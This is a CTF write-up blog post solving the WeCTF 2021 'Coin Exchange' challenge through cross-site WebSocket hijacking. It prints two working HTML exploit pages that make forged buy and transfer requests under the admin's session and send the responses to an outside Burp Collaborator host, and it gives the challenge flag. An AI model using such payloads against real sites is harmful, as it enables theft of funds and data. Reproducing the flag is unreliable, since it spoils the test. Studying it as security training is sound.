---
title: WeCTF 2021 - Coin Exchange
layout: post 
date: '2021-06-21 11:00:00'
description: solving a CSWSH vuln chall
image: 'https://i.imgur.com/wZ02kqX.jpg'
tags:
- web
- ctf
- infosec
- writeup
author: k4l1
---

Hi everyone! C:

After lot of months I'm posting here again! I played the WeCTF 2021(a only-web CTF) with my team, we got #25/574 place and the challs were awesome. I'm finally studying web vulns and now had a chance to apply that.


## Description

62 solves / 379 pts

>Shou lost a few thousand bucks on cryptocurrency. So, he decided to fake a crypto exchange and steal all the money of the users next week. Try break Shou's evil plan by stealing all his money.

>This challenge requires user interaction. Send your payload to uv.ctf.so Flag is sent when you have $5000 in the account.

>Hint: Search CSRF if you don't know what that is.

>Host 1 (San Francisco): coin.sf.ctf.so:4001
>Host 2 (Los Angeles): coin.la.ctf.so:4001
>Host 3 (New York): coin.ny.ctf.so:4001
>Host 4 (Singapore): coin.sg.ctf.so:4001
>
>Source Code: [here]([https://](https://cdn.discordapp.com/attachments/855858525087334421/855858633715351597/coin-exchange.zip))

## Coin Exchange Website

#### Login

![](https://i.imgur.com/hjm5Z54.png)

#### Exchange

![](https://i.imgur.com/vEFD7Jn.png)

#### Ranking

![](https://i.imgur.com/8t3YfA0.png)

#### Transfer

![](https://i.imgur.com/YzK1SR7.png)


## Solution

This site use Websocket instead http requests and isn't protected to CSRF, so basically we need send to admin a malicious website with CSWSH(Cross-site websocket hijacking) to transfer eth to your account.

Intercepting with BurpSuite and seeing on `WebSockets history` we can read the traffic:

![](https://i.imgur.com/GwnLdLz.png)


Checking the source, we can see how the connection is created:


```js
function start_socket(){
    socket = new WebSocket("ws://" + document.URL.substr(7).split('/')[0], "ethexchange-api");
    socket.onopen = function(e) {
        routine = setInterval(routine_update, 1000)
    };
    socket.onmessage = function(event) {
        .
        .
        .
    }
}
```

On second line we can see that it use a custom protocol called `ethexchange-api`, this will be important to connect.

For send a page to admin, I'm using `ngrok` with python `SimpleHTTPServer` and receiving the response with `Burp Collaborator`.

Let's try to code a xpl to send to admin...

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      var transfer = {"type":"transfer","content":{"amount":"3","to_token":"34450f23a163a464c4b852331ac7fe0f0f531a136f6707c02f4248ebf9f98d7c"}}

      const socket = new WebSocket('ws://coin.ny.ctf.so:4001/', "ethexchange-api");

      socket.onopen = function(e) {
        socket.send(JSON.stringify(transfer));
      }
      socket.onmessage = function(event) {
        fetch("http://81700rdv5a7etyhroodd98fodfj57u.burpcollaborator.net", {method: "POST", mode: 'cors', body: event.data}).then(response => {console.log(response.json())});
      }
    </script>
  </body>
</html>
```

Sending this to admin...

![](https://i.imgur.com/h8o4Fkp.png)

Badly, the admin don't have Eth, so we need to buy with his money(on Ranking Page show that the admin had `$1000000000000`).

```js
<!DOCTYPE html>
<html>
  <body>
    <script>
      var transfer = {"type":"transfer","content":{"amount":"3","to_token":"34450f23a163a464c4b852331ac7fe0f0f531a136f6707c02f4248ebf9f98d7c"}}
      var buy = {"type":"buy","content":{"amount":"7000"}}

      const socket = new WebSocket('ws://coin.ny.ctf.so:4001/', "ethexchange-api");

      socket.onopen = function(e) {
        socket.send(JSON.stringify(buy));
        socket.send(JSON.stringify(buy));
        socket.send(JSON.stringify(buy));
        socket.send(JSON.stringify(transfer));
      }
      socket.onmessage = function(event) {
        fetch("http://81700rdv5a7etyhroodd98fodfj57u.burpcollaborator.net", {method: "POST", mode: 'cors', body: event.data}).then(response => {console.log(response.json())});
      }
    </script>
  </body>
</html>
```

Sending again to admin, we can see that we transferred 3 eth after buy it 3 times with $7000.
![](https://i.imgur.com/XEa4u0p.png)

Intercepting again after got more than $5000:

![](https://i.imgur.com/aYLN8L9.png)

We got the flag: `we{1e1b12c8-ed85-4b2b-879d-7475febe6281@d0g3&sh1b_th3_BEST!}`


## References

* [CSWSH vuln chall](https://kalinathalie.github.io/web-chall-coin-exchange-wectf2021/)